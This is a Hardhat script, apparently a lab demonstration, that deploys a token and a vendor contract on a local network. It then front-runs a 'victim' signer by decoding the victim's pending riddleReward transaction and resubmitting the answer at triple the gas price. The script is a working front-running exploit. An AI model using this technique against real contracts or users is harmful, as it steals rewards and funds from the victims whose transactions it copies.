//@ts-nocheck
import { ethers } from "hardhat";
import { CampusToken, FHCWVendor } from "../../typechain-types";
import hre from "hardhat";
import { AddressLike } from "ethers";
import vendorABI from "../../artifacts/contracts/FHCWVendor.sol/FHCWVendor.json"

async function main() {

    const provider = ethers.provider;

    let owner: AddressLike;
    let addr1: AddressLike;
    let addr2: AddressLike;
    let addr3: AddressLike;

    [owner, addr1, addr2, addr3] = await hre.ethers.getSigners();
    console.log(`Addresses:\r\n
        1: ${await addr1.getAddress()}
        2: ${await addr2.getAddress()}
        3: ${await addr3.getAddress()}
    `);

    // ABI used to decrypt data from riddleReward transaction
    const ABI = vendorABI.abi
    // Interface to use ethers decoder base on the ABI parsed
    const iface = new ethers.Interface(ABI)

    const campusToken: CampusToken = await ethers.deployContract("CampusToken");
    
    await campusToken.waitForDeployment();

    console.log(`CampusToken deployed to ${campusToken.target}`);

    const vendorMachine: FHCWVendor = await ethers.deployContract("FHCWVendor", [campusToken.target])

    await vendorMachine.waitForDeployment();

    console.log(`FHCWVendor deployed to ${vendorMachine.target}`);

    const roleHash = await campusToken.PRIV_ROLE();

    let tx = await campusToken.grantRole(roleHash, vendorMachine.target)
    await tx.wait();

    console.log(await campusToken.hasRole(roleHash, vendorMachine.target) ? `Is priviliged` : `Didn't get priviliges`)

    // Equals 50.000 Tokens
    const initialVendorTokens = 500_000

    // Mint tokens for FHCWVendor and add them to the VendorContract address
    tx = await campusToken.mint(vendorMachine.target, initialVendorTokens);
    await tx.wait();

    console.log(`FHCWVendor now has ${await vendorMachine.balanceOfVendor() / BigInt(10)} Tokens`);

    // Owner transfers 10 ETH to Vendor - Needed so we can extract the funds from the Vendor in our attack
    tx = await owner.sendTransaction({
        to: vendorMachine.target,
        value: ethers.parseEther("10")
    })
    await tx.wait()

    console.log(`Vendor ETH balance: ${BigInt(await provider.getBalance(vendorMachine.target)) / BigInt(10 ** 18)}`)

    const tx2 = await vendorMachine.connect(addr1).riddleReward("Raccoon", {gasPrice: 50 * 10 ** 9}); // 50 Gwei transaction
    const listenedData = iface.parseTransaction({data: tx2.data, value: tx2.value})
    tx = await vendorMachine.connect(addr2).riddleReward(listenedData.args[0], {gasPrice: 150 * 10 ** 9}); // 150 Gwei transaction
    // console.log(listenedData) // If you want more information on what information can be listened on

    try {
        await tx.wait()
        await tx2.wait()
    } catch (error) {
        console.log(`Riddle solve for ${error.transaction.from} failed with ${BigInt(error.receipt.gasPrice) / BigInt(10 ** 9)} Gwei`)
    }

    console.log(`Addr1 (Victim) Balance: ${await provider.getBalance(addr1)}`)
    console.log(`Addr2 (Attacker) Balance: ${await provider.getBalance(addr2)}`)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
